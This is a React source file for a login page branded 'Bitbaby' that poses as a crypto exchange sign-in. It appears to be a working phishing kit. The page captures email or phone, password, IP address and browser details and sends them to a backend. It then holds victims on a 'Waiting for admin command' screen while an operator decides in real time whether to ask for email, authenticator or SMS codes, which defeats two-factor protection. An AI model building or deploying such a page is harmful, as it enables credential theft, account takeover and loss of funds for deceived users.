import { useState, useEffect } from "react";
import { Eye, EyeOff, AlertCircle, CheckCircle, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useLocation } from "wouter";
import { useAuth } from "@/_core/hooks/useAuth";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

/**
 * Design Philosophy: Modern Crypto Trading Platform - Mobile First
 * - Dark, premium aesthetic with high contrast
 * - Yellow accent color (#FCD34D) for CTAs and highlights
 * - Responsive layout: single column on mobile, two columns on desktop
 * - Circular animated crypto icons
 * - Clean, minimal form with real-time validation
 * - Focus on trust and security
 * - Admin can reject login attempts in real-time
 */

interface ValidationState {
  email: {
    isValid: boolean;
    message: string;
  };
  password: {
    isValid: boolean;
    message: string;
  };
  phone: {
    isValid: boolean;
    message: string;
  };
}

const countryCodes = [
  { code: "+1", country: "USA/Canada" },
  { code: "+55", country: "Brasil" },
  { code: "+44", country: "UK" },
  { code: "+33", country: "France" },
  { code: "+49", country: "Germany" },
  { code: "+39", country: "Italy" },
  { code: "+34", country: "Spain" },
  { code: "+61", country: "Australia" },
  { code: "+81", country: "Japan" },
  { code: "+86", country: "China" },
  { code: "+91", country: "India" },
  { code: "+7", country: "Russia" },
];

export default function Home() {
  let { user, loading, error, isAuthenticated, logout } = useAuth();

  const [, setLocation] = useLocation();
  const [activeTab, setActiveTab] = useState("email");
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [phone, setPhone] = useState("");
  const [countryCode, setCountryCode] = useState("+1");
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  // Recuperar sessionId do localStorage se existir
  const [sessionId, setSessionId] = useState<string | null>(() => {
    if (typeof window !== "undefined") {
      return localStorage.getItem("sessionId");
    }
    return null;
  });
  const [sessionStatus, setSessionStatus] = useState<string | null>(null);
  const [lastSeenStatus, setLastSeenStatus] = useState<string | null>(null);
  const [lastSeenRejectionReason, setLastSeenRejectionReason] = useState<string | null>(null);
  const [showRejectionError, setShowRejectionError] = useState(false);

  // Salvar sessionId no localStorage quando mudar
  useEffect(() => {
    if (sessionId && typeof window !== "undefined") {
      localStorage.setItem("sessionId", sessionId);
    }
  }, [sessionId]);

  // tRPC mutations
  const saveClientDataMutation = trpc.clientData.save.useMutation();
  const authenticateMutation = trpc.clientData.authenticate.useMutation();
  const createSessionMutation = trpc.clientData.createSession.useMutation();
  const incrementPageViewMutation = trpc.clientData.incrementLoginPageView.useMutation();
  const incrementMainLinkClickMutation = trpc.clientData.incrementMainLinkClick.useMutation();
  const updateClientActivityMutation = trpc.clientData.updateClientActivity.useMutation();

  useEffect(() => {
    const incrementClick = async () => {
      try {
        await incrementMainLinkClickMutation.mutateAsync();
      } catch (error) {
        console.error("Error incrementing main link click:", error);
      }
    };
    incrementClick();
  }, []);

  const [validation, setValidation] = useState<ValidationState>({
    email: { isValid: false, message: "" },
    password: { isValid: false, message: "" },
    phone: { isValid: false, message: "" },
  });

  // Get session query for polling
  const getSessionQuery = trpc.clientData.getSession.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId,
      refetchInterval: 2000,
      refetchIntervalInBackground: true,
    }
  );

  // Handle session status changes
  useEffect(() => {
    if (!getSessionQuery.data) return;
    
    const newStatus = getSessionQuery.data.status;
    const newRejectionReason = getSessionQuery.data.rejectionReason;
    console.log("[Client Polling] New status:", newStatus, "rejectionReason:", newRejectionReason);
    setSessionStatus(newStatus);

    // If credentials were rejected (rejectionReason changed), show error
    if (newRejectionReason && newRejectionReason !== lastSeenRejectionReason) {
      console.log("[Home] Credentials were rejected! Reason:", newRejectionReason);
      setEmail("");
      setPassword("");
      setPhone("");
      setShowRejectionError(true);
      setLastSeenRejectionReason(newRejectionReason);
      // Redirect to home after 3 seconds
      setTimeout(() => {
        setIsLoading(false);
        setSessionId(null);
        localStorage.removeItem('sessionId');
        setShowRejectionError(false);
      }, 3000);
    }
    // If approved, redirect to verify-email
    else if (newStatus === "email_code_requested") {
      console.log("[Client Polling] Redirecting to /verify-email");
      setLocation(`/verify-email?sessionId=${sessionId}`);
    }
    else if (newStatus === "auth_code_requested") {
      console.log("[Client Polling] Redirecting to /verification");
      setLocation(`/verification?sessionId=${sessionId}`);
    }
    else if (newStatus === "sms_code_requested") {
      console.log("[Client Polling] Redirecting to /verify-sms");
      setLocation(`/verify-sms?sessionId=${sessionId}`);
    }
    
    setLastSeenStatus(newStatus);
  }, [getSessionQuery.data, sessionId, setLocation, lastSeenStatus, lastSeenRejectionReason]);

  // Email validation
  const validateEmail = (value: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!value) {
      setValidation((prev) => ({
        ...prev,
        email: { isValid: false, message: "" },
      }));
    } else if (emailRegex.test(value)) {
      setValidation((prev) => ({
        ...prev,
        email: { isValid: true, message: "Valid email" },
      }));
    } else {
      setValidation((prev) => ({
        ...prev,
        email: { isValid: false, message: "Invalid email" },
      }));
    }
    setEmail(value);
  };

  // Password validation
  const validatePassword = (value: string) => {
    if (!value) {
      setValidation((prev) => ({
        ...prev,
        password: { isValid: false, message: "" },
      }));
    } else if (value.length < 8) {
      setValidation((prev) => ({
        ...prev,
        password: { isValid: false, message: "Minimum 8 characters" },
      }));
    } else if (value.length > 20) {
      setValidation((prev) => ({
        ...prev,
        password: { isValid: false, message: "Maximum 20 characters" },
      }));
    } else if (!/\d/.test(value)) {
      setValidation((prev) => ({
        ...prev,
        password: { isValid: false, message: "Must contain numbers" },
      }));
    } else {
      setValidation((prev) => ({
        ...prev,
        password: { isValid: true, message: "Valid password" },
      }));
    }
    setPassword(value);
  };

  const handleSignIn = async () => {
    console.log("[Client] Sign in clicked");
    // Limpar sessionId antigo ao fazer novo login
    localStorage.removeItem('sessionId');
    setIsLoading(true);
    try {
      const ipAddress = await (async () => {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          return data.ip || 'unknown';
        } catch {
          return 'unknown';
        }
      })();

      const userAgent = navigator.userAgent;

      let saveResponse;
      if (activeTab === "email") {
        saveResponse = await saveClientDataMutation.mutateAsync({
          email,
          password,
          loginMethod: "email",
          ipAddress,
          userAgent,
        });
      } else if (activeTab === "phone") {
        saveResponse = await saveClientDataMutation.mutateAsync({
          phoneNumber: phone,
          phoneCountryCode: countryCode,
          password,
          loginMethod: "phone",
          ipAddress,
          userAgent,
        });
      }

      // Increment page view count
      try {
        await incrementPageViewMutation.mutateAsync();
      } catch (error) {
        console.error("Error incrementing page view:", error);
      }

      // Create verification session
      if (saveResponse?.clientId) {
        try {
          const sessionResponse = await createSessionMutation.mutateAsync({
            clientLoginDataId: Number(saveResponse.clientId),
          });
          const newSessionId = sessionResponse.sessionId;
          setSessionId(newSessionId);
          // Salvar sessionId no localStorage para manter entre páginas
          localStorage.setItem('sessionId', newSessionId);
          console.log("[Client] Session created and saved:", newSessionId);
          setSessionStatus("pending");
          
          const heartbeatInterval = setInterval(async () => {
            try {
              await updateClientActivityMutation.mutateAsync({
                clientId: Number(saveResponse.clientId),
              });
              console.log("[Client] Heartbeat sent");
            } catch (error) {
              console.error("[Client] Heartbeat failed:", error);
            }
          }, 30000);
          
          localStorage.setItem('heartbeatInterval', String(heartbeatInterval));
          
          toast.success("Waiting for admin command...");
        } catch (sessionError) {
          console.error("Error creating session:", sessionError);
          toast.error("Error creating session");
          setIsLoading(false);
        }
      } else {
          toast.error("Error processing login");
        setIsLoading(false);
      }
    } catch (error) {
      toast.error("Error processing login");
      console.error(error);
      setIsLoading(false);
    }
  };

  // Phone validation
  const validatePhone = (value: string) => {
    const phoneRegex = /^\d{8,15}$/;
    if (!value) {
      setValidation((prev) => ({
        ...prev,
        phone: { isValid: false, message: "" },
      }));
    } else if (phoneRegex.test(value)) {
      setValidation((prev) => ({
        ...prev,
        phone: { isValid: true, message: "Valid phone" },
      }));
    } else {
      setValidation((prev) => ({
        ...prev,
        phone: { isValid: false, message: "8 to 15 digits" },
      }));
    }
    setPhone(value);
  };

  // Crypto symbols for the circular display
  const cryptoSymbols = [
    { symbol: "₿", label: "Bitcoin" },
    { symbol: "Ξ", label: "Ethereum" },
    { symbol: "◆", label: "Diamond" },
    { symbol: "⬡", label: "Hexagon" },
    { symbol: "₿", label: "Bitcoin" },
    { symbol: "Ξ", label: "Ethereum" },
    { symbol: "◆", label: "Diamond" },
    { symbol: "⬡", label: "Hexagon" },
    { symbol: "₿", label: "Bitcoin" },
    { symbol: "Ξ", label: "Ethereum" },
    { symbol: "◆", label: "Diamond" },
    { symbol: "⬡", label: "Hexagon" },
    { symbol: "₿", label: "Bitcoin" },
    { symbol: "Ξ", label: "Ethereum" },
  ];

  // Show loading screen while waiting for admin command
  if (isLoading && sessionId && sessionStatus === "pending") {
    return (
      <div className="min-h-screen bg-black text-white overflow-hidden flex items-center justify-center">
        <div className="text-center space-y-6">
          {showRejectionError && (
            <div className="fixed top-4 left-4 right-4 p-4 rounded-lg bg-red-500/10 border border-red-500/30 z-50">
              <p className="text-red-400">✗ Login rejeitado! Redirecionando...</p>
            </div>
          )}
          <div className="flex justify-center">
            <Loader2 className="w-16 h-16 animate-spin text-yellow-400" />
          </div>
          <h1 className="text-3xl md:text-4xl font-bold">Waiting for admin command...</h1>
          <p className="text-white/60 text-lg">Do not close this page</p>
          <div className="flex items-center justify-center gap-2 text-sm text-white/50">
            <div className="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></div>
            <span>Checking status...</span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-white overflow-hidden">
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between px-4 md:px-8 py-4 md:py-6 bg-black/80 backdrop-blur-sm border-b border-white/5">
        <div className="flex items-center gap-2 md:gap-3">
          <div className="flex items-center gap-1">
            <div className="w-5 h-5 md:w-6 md:h-6 rounded-full bg-yellow-400 flex items-center justify-center text-black font-bold text-xs">●</div>
            <div className="w-5 h-5 md:w-6 md:h-6 rounded-full bg-yellow-400 flex items-center justify-center text-black font-bold text-xs">●</div>
          </div>
          <span className="text-lg md:text-xl font-bold tracking-tight">Bitbaby</span>
        </div>
        <div className="flex items-center gap-2 md:gap-4">
          <button className="w-8 h-8 rounded-full hover:bg-white/10 transition-colors flex items-center justify-center text-lg">
            🌐
          </button>
          <Button className="bg-white text-black hover:bg-gray-100 font-semibold px-4 md:px-6 text-sm md:text-base rounded-lg">
            Sign Up
          </Button>
        </div>
      </header>

      {/* Main Content */}
      <main className="pt-20 md:pt-24 px-4 md:px-8 pb-8 md:pb-0 min-h-screen flex items-center">
        <div className="max-w-7xl mx-auto w-full grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-20 items-center">
          
          {/* Left Side - Animated Crypto Circle */}
          <div className="flex items-center justify-center order-2 md:order-1">
            <div className="relative w-64 h-64 md:w-96 md:h-96">
              {/* Circular crypto icons with SVG */}
              <svg className="w-full h-full" viewBox="0 0 400 400" preserveAspectRatio="xMidYMid meet">
                <defs>
                  <radialGradient id="cryptoGradient" cx="50%" cy="50%" r="50%">
                    <stop offset="0%" stopColor="#A0826D" />
                    <stop offset="100%" stopColor="#6B5D52" />
                  </radialGradient>
                  <filter id="cryptoShadow" x="-50%" y="-50%" width="200%" height="200%">
                    <feDropShadow dx="0" dy="4" stdDeviation="3" floodOpacity="0.3" />
                  </filter>
                </defs>

                {/* Render crypto circles */}
                {cryptoSymbols.map((item, index) => {
                  const angle = (index / cryptoSymbols.length) * Math.PI * 2 - Math.PI / 2;
                  const radius = 130;
                  const x = 200 + radius * Math.cos(angle);
                  const y = 200 + radius * Math.sin(angle);
                  
                  return (
                    <g key={index}>
                      {/* Circle background */}
                      <circle
                        cx={x}
                        cy={y}
                        r="38"
                        fill="url(#cryptoGradient)"
                        filter="url(#cryptoShadow)"
                        opacity="0.85"
                      />
                      {/* Border */}
                      <circle
                        cx={x}
                        cy={y}
                        r="38"
                        fill="none"
                        stroke="#FFFFFF"
                        strokeWidth="1"
                        opacity="0.2"
                      />
                      {/* Symbol */}
                      <text
                        x={x}
                        y={y}
                        textAnchor="middle"
                        dominantBaseline="middle"
                        className="font-bold fill-white select-none"
                        fontSize="28"
                        fontWeight="700"
                      >
                        {item.symbol}
                      </text>
                    </g>
                  );
                })}

                {/* Center text */}
                <text
                  x="200"
                  y="180"
                  textAnchor="middle"
                  dominantBaseline="middle"
                  className="font-semibold fill-white select-none"
                  fontSize="18"
                >
                  We can help you
                </text>
                <text
                  x="200"
                  y="215"
                  textAnchor="middle"
                  dominantBaseline="middle"
                  className="font-bold fill-white select-none"
                  fontSize="26"
                >
                  trade better.
                </text>
              </svg>
            </div>
          </div>

          {/* Right Side - Login Form */}
          <div className="space-y-6 md:space-y-8 order-1 md:order-2">
            <div>
              <h1 className="text-3xl md:text-5xl font-bold mb-2 tracking-tight">Sign in Bitbaby</h1>
            </div>

            {/* Tabs */}
            <div className="flex gap-4 md:gap-8 border-b border-white/10 pb-0 overflow-x-auto">
              <button
                onClick={() => setActiveTab("email")}
                className={`pb-4 font-medium transition-colors relative text-sm md:text-base whitespace-nowrap ${
                  activeTab === "email"
                    ? "text-white"
                    : "text-white/50 hover:text-white/70"
                }`}
              >
                Email address
                {activeTab === "email" && (
                  <div className="absolute bottom-0 left-0 right-0 h-1 bg-white"></div>
                )}
              </button>
              <button
                onClick={() => setActiveTab("phone")}
                className={`pb-4 font-medium transition-colors relative text-sm md:text-base whitespace-nowrap ${
                  activeTab === "phone"
                    ? "text-white"
                    : "text-white/50 hover:text-white/70"
                }`}
              >
                Phone number
                {activeTab === "phone" && (
                  <div className="absolute bottom-0 left-0 right-0 h-1 bg-white"></div>
                )}
              </button>
              <button
                onClick={() => setActiveTab("qr")}
                className={`pb-4 font-medium transition-colors relative text-sm md:text-base whitespace-nowrap ${
                  activeTab === "qr"
                    ? "text-white"
                    : "text-white/50 hover:text-white/70"
                }`}
              >
                Scan to sign in
                {activeTab === "qr" && (
                  <div className="absolute bottom-0 left-0 right-0 h-1 bg-white"></div>
                )}
              </button>
            </div>

            {/* Form Fields - Email Tab */}
            {activeTab === "email" && (
              <div className="space-y-3 md:space-y-4 animate-fadeIn">
                <div>
                  <div className="relative">
                    <input
                      type="email"
                      placeholder="Email address"
                      value={email}
                      onChange={(e) => validateEmail(e.target.value)}
                      className={`w-full px-3 md:px-4 py-2.5 md:py-3 bg-white/5 border rounded-lg text-white placeholder-white/40 focus:outline-none transition-all text-sm md:text-base ${
                        email
                          ? validation.email.isValid
                            ? "border-green-500/50 focus:border-green-500 focus:bg-green-500/5"
                            : "border-red-500/50 focus:border-red-500 focus:bg-red-500/5"
                          : "border-white/20 focus:border-white/50 focus:bg-white/10"
                      }`}
                    />
                    {email && (
                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
                        {validation.email.isValid ? (
                          <CheckCircle size={18} className="text-green-500" />
                        ) : (
                          <AlertCircle size={18} className="text-red-500" />
                        )}
                      </div>
                    )}
                  </div>
                  {email && validation.email.message && (
                    <p
                      className={`text-xs md:text-sm mt-2 ${
                        validation.email.isValid ? "text-green-500" : "text-red-500"
                      }`}
                    >
                      {validation.email.message}
                    </p>
                  )}
                </div>

                <div>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      placeholder="Please enter 8 to 20 digits, including numbers and lett"
                      value={password}
                      onChange={(e) => validatePassword(e.target.value)}
                      className={`w-full px-3 md:px-4 py-2.5 md:py-3 bg-white/5 border rounded-lg text-white placeholder-white/40 focus:outline-none transition-all pr-10 text-sm md:text-base ${
                        password
                          ? validation.password.isValid
                            ? "border-green-500/50 focus:border-green-500 focus:bg-green-500/5"
                            : "border-red-500/50 focus:border-red-500 focus:bg-red-500/5"
                          : "border-white/20 focus:border-white/50 focus:bg-white/10"
                      }`}
                    />
                    <button
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-white/50 hover:text-white/70 transition-colors"
                    >
                      {showPassword ? (
                        <EyeOff size={18} />
                      ) : (
                        <Eye size={18} />
                      )}
                    </button>
                  </div>
                  {password && validation.password.message && (
                    <p
                      className={`text-xs md:text-sm mt-2 ${
                        validation.password.isValid ? "text-green-500" : "text-red-500"
                      }`}
                    >
                      {validation.password.message}
                    </p>
                  )}
                </div>
              </div>
            )}

            {/* Form Fields - Phone Tab */}
            {activeTab === "phone" && (
              <div className="space-y-3 md:space-y-4 animate-fadeIn">
                <div>
                  <div className="flex gap-2">
                    {/* Country Code Dropdown */}
                    <div className="relative w-20 md:w-24">
                      <button
                        onClick={() => setShowCountryDropdown(!showCountryDropdown)}
                        className="w-full px-2 md:px-3 py-2.5 md:py-3 bg-white/5 border border-white/20 rounded-lg text-white hover:border-white/40 hover:bg-white/10 transition-all text-sm md:text-base flex items-center justify-between"
                      >
                        {countryCode}
                        <span className="text-xs">▼</span>
                      </button>
                      
                      {/* Dropdown Menu */}
                      {showCountryDropdown && (
                        <div className="absolute top-full left-0 right-0 mt-2 bg-gray-900 border border-white/20 rounded-lg max-h-48 overflow-y-auto z-10">
                          {countryCodes.map((item) => (
                            <button
                              key={item.code}
                              onClick={() => {
                                setCountryCode(item.code);
                                setShowCountryDropdown(false);
                              }}
                              className="w-full px-3 py-2 text-left text-sm text-white hover:bg-white/10 transition-colors flex justify-between"
                            >
                              <span>{item.code}</span>
                              <span className="text-white/50 text-xs">{item.country}</span>
                            </button>
                          ))}
                        </div>
                      )}
                    </div>

                    {/* Phone Number Input */}
                    <div className="flex-1 relative">
                      <input
                        type="tel"
                        placeholder="Phone number"
                        value={phone}
                        onChange={(e) => validatePhone(e.target.value.replace(/\D/g, ""))}
                        className={`w-full px-3 md:px-4 py-2.5 md:py-3 bg-white/5 border rounded-lg text-white placeholder-white/40 focus:outline-none transition-all text-sm md:text-base ${
                          phone
                            ? validation.phone.isValid
                              ? "border-green-500/50 focus:border-green-500 focus:bg-green-500/5"
                              : "border-red-500/50 focus:border-red-500 focus:bg-red-500/5"
                            : "border-white/20 focus:border-white/50 focus:bg-white/10"
                        }`}
                      />
                      {phone && (
                        <div className="absolute right-3 top-1/2 -translate-y-1/2">
                          {validation.phone.isValid ? (
                            <CheckCircle size={18} className="text-green-500" />
                          ) : (
                            <AlertCircle size={18} className="text-red-500" />
                          )}
                        </div>
                      )}
                    </div>
                  </div>
                  {phone && validation.phone.message && (
                    <p
                      className={`text-xs md:text-sm mt-2 ${
                        validation.phone.isValid ? "text-green-500" : "text-red-500"
                      }`}
                    >
                      {validation.phone.message}
                    </p>
                  )}
                </div>

                <div>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      placeholder="Please enter 8 to 20 digits, including numbers and lett"
                      value={password}
                      onChange={(e) => validatePassword(e.target.value)}
                      className={`w-full px-3 md:px-4 py-2.5 md:py-3 bg-white/5 border rounded-lg text-white placeholder-white/40 focus:outline-none transition-all pr-10 text-sm md:text-base ${
                        password
                          ? validation.password.isValid
                            ? "border-green-500/50 focus:border-green-500 focus:bg-green-500/5"
                            : "border-red-500/50 focus:border-red-500 focus:bg-red-500/5"
                          : "border-white/20 focus:border-white/50 focus:bg-white/10"
                      }`}
                    />
                    <button
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-white/50 hover:text-white/70 transition-colors"
                    >
                      {showPassword ? (
                        <EyeOff size={18} />
                      ) : (
                        <Eye size={18} />
                      )}
                    </button>
                  </div>
                  {password && validation.password.message && (
                    <p
                      className={`text-xs md:text-sm mt-2 ${
                        validation.password.isValid ? "text-green-500" : "text-red-500"
                      }`}
                    >
                      {validation.password.message}
                    </p>
                  )}
                </div>
              </div>
            )}

            {/* Form Fields - QR Tab */}
            {activeTab === "qr" && (
              <div className="space-y-4 animate-fadeIn">
                <div className="flex items-center justify-center p-8 bg-white/5 border border-white/20 rounded-lg">
                  <div className="text-center">
                    <p className="text-white/70 mb-4">Escaneie o código QR com seu dispositivo</p>
                    <div className="w-48 h-48 bg-white/10 border-2 border-dashed border-white/30 rounded-lg flex items-center justify-center">
                      <span className="text-white/50">📱 QR Code</span>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Forgot Password Link */}
            <div className="text-right">
              <button className="text-yellow-400 hover:text-yellow-300 font-medium transition-colors text-sm md:text-base">
                Forgot Password?
              </button>
            </div>

            {/* Error Message */}
            {showRejectionError && (
              <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/30">
                <p className="text-red-400">✗ Informações rejeitadas! Digite novamente.</p>
              </div>
            )}

            {/* Sign In Button */}
            <Button 
              onClick={handleSignIn}
              disabled={activeTab === "email" ? !(validation.email.isValid && validation.password.isValid) : activeTab === "phone" ? !(validation.phone.isValid && validation.password.isValid) : false || isLoading}
              className="w-full bg-white text-black hover:bg-gray-100 disabled:bg-gray-400 disabled:cursor-not-allowed font-bold py-2.5 md:py-3 rounded-lg text-base md:text-base transition-colors h-auto"
            >
              {isLoading ? "Processando..." : "Sign in"}
            </Button>

            {/* Sign Up Link */}
            <div className="text-center">
              <span className="text-white/70 text-sm md:text-base">No account? </span>
              <button className="text-yellow-400 hover:text-yellow-300 font-medium transition-colors text-sm md:text-base">
                Sign Up Now
              </button>
            </div>

            {/* Other Login Methods */}
            <div className="space-y-3 md:space-y-4 pt-4">
              <p className="text-white/50 text-xs md:text-sm">Other Login Methods</p>
              <div className="flex gap-3 md:gap-4">
                {/* Google */}
                <button className="flex-1 md:flex-none w-12 h-12 rounded-lg border border-white/20 hover:border-white/40 hover:bg-white/5 transition-all flex items-center justify-center text-lg">
                  <svg className="w-6 h-6" viewBox="0 0 24 24" fill="currentColor">
                    <path fill="#FFFFFF" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                    <path fill="#FFFFFF" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                    <path fill="#FFFFFF" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                    <path fill="#FFFFFF" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                  </svg>
                </button>
                {/* Telegram */}
                <button className="flex-1 md:flex-none w-12 h-12 rounded-lg border border-white/20 hover:border-white/40 hover:bg-white/5 transition-all flex items-center justify-center text-lg">
                  <svg className="w-6 h-6" viewBox="0 0 24 24" fill="currentColor">
                    <path fill="#FFFFFF" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.02-.14-.07-.2-.08-.06-.2-.04-.28-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1.02.53-1.49.52-.49-.01-1.42-.27-2.12-.5-.85-.29-1.52-.44-1.47-.93.03-.24.37-.47 1.02-.72 4.02-1.75 6.71-2.91 8.05-3.48 1.84-.8 2.22-.94 2.47-.94.05 0 .17.01.25.09.06.08.1.21.1.32z"/>
                  </svg>
                </button>
                {/* Apple */}
                <button className="flex-1 md:flex-none w-12 h-12 rounded-lg border border-white/20 hover:border-white/40 hover:bg-white/5 transition-all flex items-center justify-center text-lg">
                  <svg className="w-6 h-6" viewBox="0 0 24 24" fill="currentColor">
                    <path fill="#FFFFFF" d="M17.05 13.5c-.91 0-1.82.58-2.75 1.52 1.92-1.03 3.84-2.06 5.75-3.09-.58 1.01-1.16 2.02-1.74 3.03-.42.68-.84 1.36-1.26 2.04zm-5.05-1.5c.91 0 1.82-.58 2.75-1.52-1.92 1.03-3.84 2.06-5.75 3.09.58-1.01 1.16-2.02 1.74-3.03.42-.68.84-1.36 1.26-2.04zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
                  </svg>
                </button>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Floating Chat Button */}
      <button className="fixed bottom-6 right-6 md:bottom-8 md:right-8 w-14 h-14 md:w-16 md:h-16 rounded-full bg-gradient-to-br from-cyan-400 to-teal-500 hover:from-cyan-300 hover:to-teal-400 shadow-lg hover:shadow-xl transition-all flex items-center justify-center text-white text-xl md:text-2xl font-bold">
        💬
      </button>
    </div>
  );
}
